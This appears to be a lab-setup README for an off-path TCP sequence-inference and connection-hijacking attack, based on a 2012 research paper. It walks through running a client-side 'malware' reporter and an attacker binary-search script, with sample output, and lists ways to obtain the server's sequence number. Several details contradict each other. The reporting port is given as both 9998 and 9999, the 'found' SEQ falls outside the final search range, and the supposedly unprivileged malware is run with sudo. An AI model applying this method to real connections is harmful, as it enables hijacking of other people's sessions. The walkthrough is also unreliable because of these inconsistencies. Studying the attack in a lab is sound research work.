# Preemptive-SYN Hijacking Lab Setup

## Network Topology

```
Attacker VM (30.0.0.30)
      ↓
   AttackNet (30.0.0.0/24)
      ↓
NAT Router (30.0.0.1, 10.0.0.1, 20.0.0.1)
    ↙        ↘
PrivateNet     PublicNet
10.0.0.0/24    20.0.0.0/24
    ↓              ↓
Client (10.0.0.10) Server (20.0.0.20)
```

---

## Prerequisites

### All VMs
```bash
sudo apt update
sudo apt install python3-pip python3-scapy netcat-traditional net-tools
pip3 install scapy
```

### Router (Enable IP Forwarding)
```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

---

## Execution Steps

### Step 1: Start Server (Server VM)

```bash
cd ~
sudo python3 server_hijack.py
```

Expected output:
```
============================================================
  Server listening on 0.0.0.0:8080
============================================================
```

---

### Step 2: Start Malware (Client VM)

Copy malware.py to client VM, then:

```bash
cd ~
# Make sure you have internet access to /proc/net/netstat
sudo python3 malware.py
```

Expected output:
```
============================================================
  Unprivileged Malware (Client VM)
============================================================
[*] Attacker: 30.0.0.30
[*] Monitoring for new connections...
[*] Listening for attacker queries on port 9998
============================================================
```

---

### Step 3: Start Attacker Inference (Attacker VM)

```bash
cd ~
sudo python3 attacker_inference.py
```

Expected output:
```
============================================================
  Attacker (Off-Path) - 30.0.0.30
============================================================
[*] Waiting for malware to report new connection...
```

---

### Step 4: Create Connection (Client VM)

In a NEW TERMINAL on Client VM:

```bash
nc 20.0.0.20 8080
```

Type something and press Enter:
```
hello from client
```

---

### Step 5: Watch Magic Happen

#### On Malware Terminal (Client VM)
You should see:
```
[!] NEW CONNECTION DETECTED
    Local:  10.0.0.10:45678
    Remote: 20.0.0.20:8080
[+] Sent to attacker: CONN:10.0.0.10:45678:20.0.0.20:8080
```

#### On Attacker Terminal
Binary search starts:
```
[!] CONNECTION RECEIVED FROM MALWARE
    Client:  10.0.0.10
    Server:  20.0.0.20

============================================================
  BINARY SEARCH: Finding Client SEQ
============================================================

[*] Baseline: InSegs=12345, OutSegs=6789

[1] Testing SEQ=2147483648
    Range: [0, 4294967295]
    InSegs diff: 0
    ✗ SEQ 2147483648 OUT-OF-WINDOW

[2] Testing SEQ=1073741824
    Range: [0, 2147483648]
    InSegs diff: 1
    ✓ SEQ 1073741824 IN-WINDOW
    
[3] Testing SEQ=1610612736
    Range: [1073741824, 2147483648]
    InSegs diff: 0
    ✗ SEQ 1610612736 OUT-OF-WINDOW

... (continues with binary search)

[32] Testing SEQ=3464045900
    Range: [3464045890, 3464045910]
    InSegs diff: 1
    ✓ SEQ 3464045900 IN-WINDOW

============================================================
  FOUND SEQ: 3464045860
============================================================

[+] Inferred Client SEQ: 3464045860
[*] Next step: Attacker sends spoofed SYN-ACK and hijacks connection
```

---

## Understanding the Attack

### Phase 1: Connection Detection
- Client initiates connection to Server
- Malware detects it via `/proc/net/netstat`
- Malware sends 4-tuple to Attacker

### Phase 2: Binary Search (Side-Channel)
- Attacker sends probing packets with different SEQ values
- Each packet is spoofed with client's IP
- Packets out-of-window → dropped → packet count doesn't change
- Packets in-window → accepted by server → packet count increases
- Malware reports count changes back to attacker
- Attacker performs binary search: ~32 iterations to find exact SEQ

### Phase 3: Hijacking (Not fully implemented yet)
- Once SEQ found, attacker needs server's SEQ (as ACK)
- Infer from challenge ACK or firewall logs
- Send spoofed data packets
- Server processes them (thinks they're from client)
- Connection hijacked!

---

## Key Code Files

| File | VM | Purpose |
|------|-----|---------|
| `malware.py` | Client | Monitors connections, reports to attacker |
| `attacker_inference.py` | Attacker | Binary search with packet counter feedback |
| `attacker_hijack.py` | Attacker | Performs hijacking (once SEQ found) |
| `server_hijack.py` | Server | Simple server accepting connections |

---

## Troubleshooting

### Malware not reporting connection
```bash
# Check if malware is running
ps aux | grep malware.py

# Check network connectivity
ping 30.0.0.30 from client

# Verify port 9999 is listening
ss -ulnp | grep 9999
```

### Attacker not receiving connection
```bash
# Check if attacker is listening
ss -ulnp | grep 9999

# Verify firewall allows UDP
sudo ufw allow 9999/udp
```

### Packet counts not changing
```bash
# Check if /proc/net/netstat is readable
cat /proc/net/netstat | grep TcpExt

# Verify netstat command works
netstat -tn | grep ESTABLISHED
```

---

## What This Demonstrates

✓ **Off-path attack** - Attacker on different subnet (30.0.0.0/24)
✓ **Side-channel feedback** - Uses packet counters, not firewall cooperation
✓ **Binary search** - Much faster than brute force (32 iterations vs 65536)
✓ **Unprivileged malware** - Only reads /proc/net/netstat (no root needed)
✓ **Real-world technique** - Based on IEEE S&P 2012 paper

---

## Advanced: Getting Server's SEQ

To complete the hijacking, you also need the server's SEQ as your ACK.

Methods:
1. **Firewall logs** - If you control the router
2. **tcpdump** - Sniff the SYN-ACK on the network
3. **Challenge ACK** - Send wrong ACK, server responds with correct SEQ
4. **IPID side-channel** - Advanced technique from paper

Example with tcpdump (on Router):
```bash
sudo tcpdump -i eth1 'tcp port 8080 and tcp[tcpflags] & tcp-syn != 0' -n
```

Look for the SYN-ACK from server, extract its SEQ field.

---

## References

- Qian, Z., & Mao, Z. M. (2012). "Off-Path TCP Sequence Number Inference Attack." 
  IEEE S&P 2012.
- Paper demonstrates packet counter side-channel for off-path attacks
- This lab implements the **Preemptive-SYN** hijacking variant

---

## Disclaimer

This is for **educational and research purposes only** in controlled lab environments.
Unauthorized access to computer systems is illegal.
